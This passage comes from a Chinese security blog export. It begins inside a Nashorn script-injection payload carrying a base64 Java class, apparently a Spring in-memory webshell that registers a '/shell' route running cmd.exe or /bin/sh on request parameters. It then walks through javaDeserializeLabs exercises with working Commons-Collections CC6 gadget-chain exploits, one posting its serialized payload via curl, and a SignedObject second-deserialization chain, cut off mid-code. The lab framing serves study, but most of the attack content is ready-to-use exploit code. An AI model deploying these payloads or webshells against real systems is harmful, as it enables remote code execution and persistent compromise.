cjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAARtYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEABGFyZ3MBABNbTGphdmEvbGFuZy9TdHJpbmc7AQABdAEAClNvdXJjZUZpbGUBAApwb2NfMS5qYXZhDAA6ADsHAMEMAMIAwwEAOW9yZy5zcHJpbmdmcmFtZXdvcmsud2ViLnNlcnZsZXQuRGlzcGF0Y2hlclNlcnZsZXQuQ09OVEVYVAcAxAwAxQDGAQA1b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9XZWJBcHBsaWNhdGlvbkNvbnRleHQBAFJvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvYW5ub3RhdGlvbi9SZXF1ZXN0TWFwcGluZ0hhbmRsZXJNYXBwaW5nDADHAMgBAAVwb2NfMQEAD2phdmEvbGFuZy9DbGFzcwwAyQDKAQBGb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL1BhdHRlcm5zUmVxdWVzdENvbmRpdGlvbgEAEGphdmEvbGFuZy9TdHJpbmcBAAYvc2hlbGwMADoAegEATG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9SZXF1ZXN0TWV0aG9kc1JlcXVlc3RDb25kaXRpb24BADVvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9iaW5kL2Fubm90YXRpb24vUmVxdWVzdE1ldGhvZAwAOgDLAQA9b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbwwAOgDMAQADeHh4DAA6AFEMAM0AzgEAQG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvcmVxdWVzdC9TZXJ2bGV0UmVxdWVzdEF0dHJpYnV0ZXMMAM8A0AwA0QDSBwC%2BDADTANQHAL0MANUA1gEAAAEAB29zLm5hbWUHANcMANgA1gwA2QDaAQADd2luDADbANwBABhqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXIBAAdjbWQuZXhlAQACL2MBAAcvYmluL3NoAQACLWMBABFqYXZhL3V0aWwvU2Nhbm5lcgwA3QDeBwDfDADgAOEMADoA4gEAA1xcQQwA4wDkDADlAOYMAOcA2gwA6AA7BwC%2FDADpAFEMAOoAOwEAE2phdmEvbGFuZy9FeGNlcHRpb24MAOsA7AEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAfamF2YS9sYW5nL05vU3VjaE1ldGhvZEV4Y2VwdGlvbgEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QBACZqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZQEAE2phdmEvaW8vUHJpbnRXcml0ZXIBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BADxvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9jb250ZXh0L3JlcXVlc3QvUmVxdWVzdENvbnRleHRIb2xkZXIBABhjdXJyZW50UmVxdWVzdEF0dHJpYnV0ZXMBAD0oKUxvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9jb250ZXh0L3JlcXVlc3QvUmVxdWVzdEF0dHJpYnV0ZXM7AQA5b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9yZXF1ZXN0L1JlcXVlc3RBdHRyaWJ1dGVzAQAMZ2V0QXR0cmlidXRlAQAnKExqYXZhL2xhbmcvU3RyaW5nO0kpTGphdmEvbGFuZy9PYmplY3Q7AQAHZ2V0QmVhbgEAJShMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL09iamVjdDsBAAlnZXRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQA7KFtMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvYmluZC9hbm5vdGF0aW9uL1JlcXVlc3RNZXRob2Q7KVYBAfYoTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9QYXR0ZXJuc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9SZXF1ZXN0TWV0aG9kc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9QYXJhbXNSZXF1ZXN0Q29uZGl0aW9uO0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vSGVhZGVyc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9Db25zdW1lc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9Qcm9kdWNlc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9SZXF1ZXN0Q29uZGl0aW9uOylWAQAPcmVnaXN0ZXJNYXBwaW5nAQBuKExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvUmVxdWVzdE1hcHBpbmdJbmZvO0xqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7KVYBAApnZXRSZXF1ZXN0AQApKClMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAtnZXRSZXNwb25zZQEAKigpTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQAMZ2V0UGFyYW1ldGVyAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBAAt0b0xvd2VyQ2FzZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBAAVzdGFydAEAFSgpTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEAB2hhc05leHQBAAMoKVoBAARuZXh0AQAFY2xvc2UBAAV3cml0ZQEABWZsdXNoAQAJc2VuZEVycm9yAQAEKEkpVgAhAAgAOQAAAAAABgABADoAOwACADwAAAEFAAkACAAAAHEqtwABuAACEgMDuQAEAwDAAAVMKxIGuQAHAgDAAAZNEggSCQO9AAq2AAtOuwAMWQS9AA1ZAxIOU7cADzoEuwAQWQO9ABG3ABI6BbsAE1kZBBkFAQEBAQG3ABQ6BrsACFkSFbcAFjoHLBkGGQcttgAXsQAAAAIAPQAAACoACgAAABYABAAYABMAGQAfABoAKwAbAD0AHABKAB0AXAAeAGcAHwBwACAAPgAAAFIACAAAAHEAPwBAAAAAEwBeAEEAQgABAB8AUgBDAEQAAgArAEYARQBGAAMAPQA0AEcASAAEAEoAJwBJAEoABQBcABUASwBMAAYAZwAKAE0AQAAHAE4AAAAGAAIATwBQAAEAOgBRAAIAPAAAAD0AAQACAAAABSq3AAGxAAAAAgA9AAAACgACAAAAIgAEACQAPgAAABYAAgAAAAUAPwBAAAAAAAAFAFIAUwABAFQAAAAFAQBSAAAAAQBVADsAAgA8AAAB4QAGAAgAAADGuAACwAAYwAAYtgAZTLgAAsAAGMAAGLYAGk0suQAbAQBOKxIcuQAdAgA6BBIeOgUSH7gAILYAIRIitgAjmQAiuwAkWQa9AA1ZAxIlU1kEEiZTWQUZBFO3ACc6BqcAH7sAJFkGvQANWQMSKFNZBBIpU1kFGQRTtwAnOga7ACpZGQa2ACu2ACy3AC0SLrYALzoHGQe2ADCZAAsZB7YAMacABRkFOgUZB7YAMi0ZBbYAMy22ADQttgA1pwAOOgUsEQGUuQA3AgCxAAEAKwC3ALoANgADAD0AAABKABIAAAAnAA0AKAAaACkAIQAqACsALAAvAC4APwAvAF4AMQB6ADMAkAA0AKQANQCpADYArwA3ALMAOAC3ADsAugA5ALwAOgDFADwAPgAAAGYACgBbAAMAVgBXAAYALwCIAFgAUwAFAHoAPQBWAFcABgCQACcAWQBaAAcAvAAJAFsAXAAFAAAAxgA%2FAEAAAAANALkAXQBeAAEAGgCsAF8AYAACACEApQBhAGIAAwArAJsAYwBTAAQAZAAAAEUABv8AXgAGBwBlBwBmBwBnBwBoBwBpBwBpAAD8ABsHAGr8ACUHAGtBBwBp%2FwAXAAUHAGUHAGYHAGcHAGgHAGkAAQcAbAoATgAAAAQAAQA2AAEAbQBuAAMAPAAAAD8AAAADAAAAAbEAAAACAD0AAAAGAAEAAABAAD4AAAAgAAMAAAABAD8AQAAAAAAAAQBvAHAAAQAAAAEAcQByAAIATgAAAAQAAQBzAFQAAAAJAgBvAAAAcQAAAAEAbQB0AAMAPAAAAEkAAAAEAAAAAbEAAAACAD0AAAAGAAEAAABEAD4AAAAqAAQAAAABAD8AQAAAAAAAAQBvAHAAAQAAAAEAdQB2AAIAAAABAHcAeAADAE4AAAAEAAEAcwBUAAAADQMAbwAAAHUAAAB3AAAACQB5AHoAAwA8AAAAQQACAAIAAAAJuwAIWbcAOEyxAAAAAgA9AAAACgACAAAARwAIAEgAPgAAABYAAgAAAAkAewB8AAAACAABAH0AQAABAE4AAAAEAAEANgBUAAAABQEAewAAAAEAfgAAAAIAfw%3D%3D&#39;%3Bvar%20bytes%20%3D%20java.util.Base64.getDecoder().decode(classBytes)%3Bvar%20constructor%20%3D%20clazz.getDeclaredConstructor()%3Bconstructor.setAccessible(true)%3Bvar%20clz%20%3D%20method.invoke(constructor.newInstance()%2C%20bytes%2C%200%20%2C%20bytes.length)%3Bclz.newInstance()%3B%7D</span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">$&#123;script:nashorn:var clazz &#x3D; java.security.SecureClassLoader.class;var method &#x3D; clazz.getSuperclass().getDeclaredMethod(&#39;defineClass&#39;, &#39;anything&#39;.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);method.setAccessible(true);var classBytes &#x3D; &#39;yv66vgAAADQAIQoACAASCgATABQIABUKABMAFgcAFwoABQAYBwAZBwAaAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEADVN0YWNrTWFwVGFibGUHABkHABcBAApTb3VyY2VGaWxlAQAIcG9jLmphdmEMAAkACgcAGwwAHAAdAQAEY2FsYwwAHgAfAQATamF2YS9sYW5nL0V4Y2VwdGlvbgwAIAAKAQADcG9jAQAQamF2YS9sYW5nL09iamVjdAEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA9wcmludFN0YWNrVHJhY2UAIQAHAAgAAAAAAAEAAQAJAAoAAQALAAAAYAACAAIAAAAWKrcAAbgAAhIDtgAEV6cACEwrtgAGsQABAAQADQAQAAUAAgAMAAAAGgAGAAAAAgAEAAQADQAHABAABQARAAYAFQAIAA0AAAAQAAL&#x2F;ABAAAQcADgABBwAPBAABABAAAAACABE&#x3D;&#39;;var bytes &#x3D; java.util.Base64.getDecoder().decode(classBytes);var constructor &#x3D; clazz.getDeclaredConstructor();constructor.setAccessible(true);var clz &#x3D; method.invoke(constructor.newInstance(), bytes, 0 , bytes.length);clz.newInstance();&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n","categories":["Java反序列化"]},{"title":"javaDeserializeLabs","url":"/2023/12/25/java-serlab/","content":"<p>项目地址：<a href=\"https://github.com/waderwu/javaDeserializeLabs/tree/master/docker\">javaDeserializeLabs</a></p>\n<a id=\"more\"></a>\n\n<h1 id=\"Lab1\"><a href=\"#Lab1\" class=\"headerlink\" title=\"Lab1\"></a>Lab1</h1><p>反编译后很简单</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-serlab/image-20221114212256123.png\" alt=\"image-20221114212256123\"></p>\n<p>Calc</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.yxxx.javasec.deserialize;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.Serializable;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Calc</span> <span class=\"keyword\">implements</span> <span class=\"title\">Serializable</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">boolean</span> canPopCalc = <span class=\"keyword\">true</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> String cmd = <span class=\"string\">&quot;calc&quot;</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>poc</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> com.yxxx.javasec.deserialize.Calc;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.ByteArrayOutputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.ObjectOutputStream;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">poc</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        Calc calc = <span class=\"keyword\">new</span> Calc();</span><br><span class=\"line\">        String payload = objectToHexString(calc);</span><br><span class=\"line\">        System.out.println(payload);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> String <span class=\"title\">bytesTohexString</span><span class=\"params\">(<span class=\"keyword\">byte</span>[] bytes)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (bytes == <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            StringBuilder ret = <span class=\"keyword\">new</span> StringBuilder(<span class=\"number\">2</span> * bytes.length);</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; bytes.length; ++i) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">int</span> b = <span class=\"number\">15</span> &amp; bytes[i] &gt;&gt; <span class=\"number\">4</span>;</span><br><span class=\"line\">                ret.append(<span class=\"string\">&quot;0123456789abcdef&quot;</span>.charAt(b));</span><br><span class=\"line\">                b = <span class=\"number\">15</span> &amp; bytes[i];</span><br><span class=\"line\">                ret.append(<span class=\"string\">&quot;0123456789abcdef&quot;</span>.charAt(b));</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">return</span> ret.toString();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> String <span class=\"title\">objectToHexString</span><span class=\"params\">(Object obj)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        ByteArrayOutputStream bos = <span class=\"keyword\">new</span> ByteArrayOutputStream();</span><br><span class=\"line\">        ObjectOutputStream out = <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        out = <span class=\"keyword\">new</span> ObjectOutputStream(bos);</span><br><span class=\"line\">        out.writeObject(obj);</span><br><span class=\"line\">        out.flush();</span><br><span class=\"line\">        <span class=\"keyword\">byte</span>[] bytes = bos.toByteArray();</span><br><span class=\"line\">        bos.close();</span><br><span class=\"line\">        String hex = bytesTohexString(bytes);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> hex;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"Lab2\"><a href=\"#Lab2\" class=\"headerlink\" title=\"Lab2\"></a>Lab2</h1><p>存在CC依赖，加了两个条件判断readUTF和readInt</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-serlab/image-20221114212948281.png\" alt=\"image-20221114212948281\"></p>\n<p>在将对象转为字节流时加上UTF以及Int</p>\n<p>exp</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.Transformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.ByteArrayOutputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.ObjectOutputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Field;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.HashMap;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Map;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">poc</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        Transformer[] transformers = <span class=\"keyword\">new</span> Transformer[]&#123;</span><br><span class=\"line\">                <span class=\"keyword\">new</span> ConstantTransformer(Runtime.class),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;getMethod&quot;</span>, <span class=\"keyword\">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class=\"keyword\">new</span> Object[]&#123;<span class=\"string\">&quot;getRuntime&quot;</span>, <span class=\"keyword\">null</span>&#125;),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;invoke&quot;</span>, <span class=\"keyword\">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class=\"keyword\">new</span> Object[]&#123;<span class=\"keyword\">null</span>, <span class=\"keyword\">null</span>&#125;),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;exec&quot;</span>, <span class=\"keyword\">new</span> Class[]&#123;String.class&#125;, <span class=\"keyword\">new</span> Object[]&#123;<span class=\"string\">&quot;calc&quot;</span>&#125;)</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">        ChainedTransformer chainedTransformer = <span class=\"keyword\">new</span> ChainedTransformer(transformers);</span><br><span class=\"line\"></span><br><span class=\"line\">        Map&lt;Object, Object&gt; map = <span class=\"keyword\">new</span> HashMap&lt;&gt;();</span><br><span class=\"line\">        Map&lt;Object,Object&gt; lazymap = LazyMap.decorate(map, <span class=\"keyword\">new</span> ConstantTransformer(<span class=\"number\">1</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">        TiedMapEntry tiedMapEntry = <span class=\"keyword\">new</span> TiedMapEntry(lazymap,<span class=\"string\">&quot;aaa&quot;</span>);</span><br><span class=\"line\">        Map&lt;Object,Object&gt; hashmap = <span class=\"keyword\">new</span> HashMap&lt;&gt;();</span><br><span class=\"line\">        hashmap.put(tiedMapEntry,<span class=\"string\">&quot;bbb&quot;</span>);</span><br><span class=\"line\">        lazymap.remove(<span class=\"string\">&quot;aaa&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        Class c = LazyMap.class;</span><br><span class=\"line\">        Field factory = c.getDeclaredField(<span class=\"string\">&quot;factory&quot;</span>);</span><br><span class=\"line\">        factory.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        factory.set(lazymap,chainedTransformer);</span><br><span class=\"line\"></span><br><span class=\"line\">        String payload = objectToHexString(hashmap);</span><br><span class=\"line\">        Runtime.getRuntime().exec(<span class=\"string\">&quot;curl http://127.0.0.1:8080/basic?data=&quot;</span>+payload);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> String <span class=\"title\">bytesTohexString</span><span class=\"params\">(<span class=\"keyword\">byte</span>[] bytes)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (bytes == <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            StringBuilder ret = <span class=\"keyword\">new</span> StringBuilder(<span class=\"number\">2</span> * bytes.length);</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; bytes.length; ++i) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">int</span> b = <span class=\"number\">15</span> &amp; bytes[i] &gt;&gt; <span class=\"number\">4</span>;</span><br><span class=\"line\">                ret.append(<span class=\"string\">&quot;0123456789abcdef&quot;</span>.charAt(b));</span><br><span class=\"line\">                b = <span class=\"number\">15</span> &amp; bytes[i];</span><br><span class=\"line\">                ret.append(<span class=\"string\">&quot;0123456789abcdef&quot;</span>.charAt(b));</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> ret.toString();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> String <span class=\"title\">objectToHexString</span><span class=\"params\">(Object obj)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        ByteArrayOutputStream bos = <span class=\"keyword\">new</span> ByteArrayOutputStream();</span><br><span class=\"line\">        ObjectOutputStream out = <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        out = <span class=\"keyword\">new</span> ObjectOutputStream(bos);</span><br><span class=\"line\">        out.writeUTF(<span class=\"string\">&quot;SJTU&quot;</span>);  <span class=\"comment\">// 加入UTF</span></span><br><span class=\"line\">        out.writeInt(<span class=\"number\">1896</span>);    <span class=\"comment\">// 加入Int</span></span><br><span class=\"line\">        out.writeObject(obj);</span><br><span class=\"line\">        out.flush();</span><br><span class=\"line\">        <span class=\"keyword\">byte</span>[] bytes = bos.toByteArray();</span><br><span class=\"line\">        bos.close();</span><br><span class=\"line\">        String hex = bytesTohexString(bytes);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> hex;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"Lab3\"><a href=\"#Lab3\" class=\"headerlink\" title=\"Lab3\"></a>Lab3</h1><p>存在cc依赖，但是利用自己编写了个MyObjectInputStream代替ObjectInputStream</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-serlab/image-20221114220517943.png\" alt=\"image-20221114220517943\"></p>\n<p>看一下是怎么处理的，resolveClass通过 <strong>URLClassLoader.loadClass</strong> 进行加载类，这里就有问题了，这种类加载方式不支持加载数组。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-serlab/image-20221114220605804.png\" alt=\"image-20221114220605804\"></p>\n<p>利用 <strong>CC依赖中的InvokerTransformer实现任意方法调用</strong>，构造方法如下，由于数组无法被加载，所以调用的方法必须为无参，该方法达到的目的 <strong>要么是RCE，要么 是可以二次反序列化</strong>。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">private InvokerTransformer(String methodName) &#123;</span><br><span class=\"line\">      this.iMethodName &#x3D; methodName;</span><br><span class=\"line\">      this.iParamTypes &#x3D; null;</span><br><span class=\"line\">      this.iArgs &#x3D; null;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123;</span><br><span class=\"line\">      this.iMethodName &#x3D; methodName;</span><br><span class=\"line\">      this.iParamTypes &#x3D; paramTypes;</span><br><span class=\"line\">      this.iArgs &#x3D; args;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"SignedObject\"><a href=\"#SignedObject\" class=\"headerlink\" title=\"SignedObject\"></a>SignedObject</h2><p>参考：<a href=\"https://tttang.com/archive/1701/#toc_signedobject\">二次反序列化 看我一命通关 - 跳跳糖 (tttang.com)</a>，利用链如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">HashMap.readObject-&gt;HashMap.hash-&gt;TiedMapEntry.hashcode-&gt;LazyMap.get-&gt;InvokerTransformer.transform-&gt;SignedObject.getObject</span><br></pre></td></tr></table></figure>\n\n<p>exp，打cc6</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.Transformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Field;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.HashMap;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Map;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">exp</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> HashMap <span class=\"title\">CC6</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        Transformer[] transformers = <span class=\"keyword\">new</span> Transformer[]&#123;</span><br><span class=\"line\">                <span class=\"keyword\">new</span> ConstantTransformer(Runtime.class),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;getMethod&quot;</span>, <span class=\"keyword\">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class=\"keyword\">new</span> Object[]&#123;<span class=\"string\">&quot;getRuntime&quot;</span>, <span class=\"keyword\">null</span>&#125;),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;invoke&quot;</span>, <span class=\"keyword\">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class=\"keyword\">new</span> Object[]&#123;<span class=\"keyword\">null</span>, <span class=\"keyword\">null</span>&#125;),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;exec&quot;</span>, <span class=\"keyword\">new</span> Class[]&#123;String.class&#125;, <span class=\"keyword\">new</span> Object[]&#123;<span class=\"string\">&quot;calc&quot;</span>&#125;)</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">        ChainedTransformer chainedTransformer = <span class=\"keyword\">new</span> ChainedTransformer(transformers);</span><br><span 